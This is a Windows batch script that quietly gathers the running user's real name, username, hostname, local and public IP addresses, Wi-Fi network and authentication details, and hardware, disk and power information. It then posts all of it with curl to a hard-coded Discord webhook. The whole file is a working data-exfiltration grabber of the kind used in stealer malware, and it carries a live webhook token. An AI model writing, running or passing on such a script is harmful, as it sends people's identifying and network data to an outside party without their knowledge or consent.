@echo off
chcp 65001 >nul

:: --- Basic Info ---
set "username=%username%"
for /f %%i in ('hostname') do set "hostname=%%i"

:: Real name
for /f "tokens=2 delims==" %%a in ('wmic useraccount where name^="%username%" get fullname /value 2^>nul') do set "realname=%%a"
if not defined realname set "realname=%username%"

:: IPs
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr "IPv4"') do set "localip=%%a"
set "localip=%localip: =%"

for /f "delims=" %%i in ('powershell -Command "(Invoke-WebRequest -Uri https://api.ipify.org -UseBasicParsing).Content" 2^>nul') do set "publicip=%%i"

:: Wi-Fi
set "wifi_ssid=N/A"
set "wifi_auth=N/A"
for /f "tokens=2 delims=:" %%A in ('netsh wlan show interfaces ^| findstr /C:"SSID" ^| findstr /V "BSSID"') do set "wifi_ssid=%%A"
if not "%wifi_ssid%"=="N/A" (
    for /f "tokens=2* delims=:" %%A in ('netsh wlan show profile name^="%wifi_ssid%" key^=clear ^| findstr /C:"Authentication"') do set "wifi_auth=%%B"
)

:: CPU, RAM, GPU
for /f "delims=" %%G in ('powershell -NoProfile -Command "(Get-CimInstance Win32_Processor | Select-Object -First 1 -ExpandProperty Name)"') do set "cpu=%%G"
for /f "delims=" %%G in ('powershell -NoProfile -Command "(Get-CimInstance Win32_Processor | Select-Object -First 1 -ExpandProperty NumberOfCores).ToString()"') do set "cores=%%G"
for /f "delims=" %%G in ('powershell -NoProfile -Command "[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2).ToString()"') do set "ram=%%G"
for /f "delims=" %%G in ('powershell -NoProfile -Command "(Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name) -join ', '"') do set "gpu=%%G"

:: Disk
set "disk="
for /f "skip=1 tokens=1,2,3,4 delims= " %%A in ('wmic logicaldisk get caption^, description^, freespace^, size') do (
    if "%%A" NEQ "" set "disk=!disk!Drive %%A - %%B, Free: %%C, Total: %%D\n"
)

:: Power
for /f "tokens=*" %%A in ('powercfg /getactivescheme') do set "power=Active Power Scheme: %%A"

:: Webhook URL
set "webhook=https://discord.com/api/webhooks/1428753280187764787/QEvl5eKV66t35kTLtrbJXOM0W9XkDwUleol9n1OFLrA6Rmdj2dtvUq5A4Ijat7pjnFz_"

:: --- Combine all info into JSON with \n for line breaks ---
setlocal enabledelayedexpansion
set "content=🌐 System / Network Info\nDate/Time: %date% %time%\nReal Name: %realname%\nUsername: %username%\nHostname: %hostname%\nLocal IP: %localip%\nPublic IP: %publicip%\nWi-Fi SSID: %wifi_ssid%\nWi-Fi Auth: %wifi_auth%\n__________\n🖥️ Hardware Info\nCPU: %cpu% (%cores% cores)\nRAM: %ram% GB\nGPU(s): %gpu%\n__________\n💾 Disk Info\n!disk!__________\n🔌 Power Info\n%power%\n__________"

:: Escape quotes
set "json=!content:"=\"!"

:: Send to Discord
curl -s -X POST -H "Content-Type: application/json" -d "{\"content\":\"!json!\"}" "%webhook%"

endlocal
pause


